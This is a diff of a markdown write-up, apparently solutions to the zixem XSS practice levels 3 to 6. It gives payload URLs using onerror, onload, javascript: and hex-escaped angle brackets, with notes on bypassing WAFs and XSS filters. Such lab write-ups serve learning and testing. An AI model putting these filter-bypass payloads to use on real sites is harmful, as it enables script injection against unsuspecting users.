@@ -6,4 +6,8 @@ Level 3: [https://zixem.altervista.org/XSS/3.php?name=zxm%0A`<img src=”x” on
   (e.g., using %0A for a newline), the filter may fail to detect it, allowing bypass techniques for XSS, SQLi, and other attacks. \
 Level 4: [http://zixem.altervista.org/XSS/4.php?img=htp.pngd'onerror=alert(1337)%20](http://zixem.altervista.org/XSS/4.php?img=htp.pngd'onerror=alert(1337)%20) \
 Level 5: https://zixem.altervista.org/XSS/5.php?name=zxm&action=javascript:alert(1337)
+Level 6: https://zixem.altervista.org/XSS/6.php?name=\x3Csvg/onload=alert(1337)\x3E or \
+https://zixem.altervista.org/XSS/6.php?name=\x3Cimg/src=%22x%22%20onerror=alert(1337)\x3E
+\x3E and \x3C are hexadecimal escape sequences used in programming languages like JavaScript and C. \
+These can be used to bypass WAFs or XSS filters by encoding < and > in attack payloads.
 
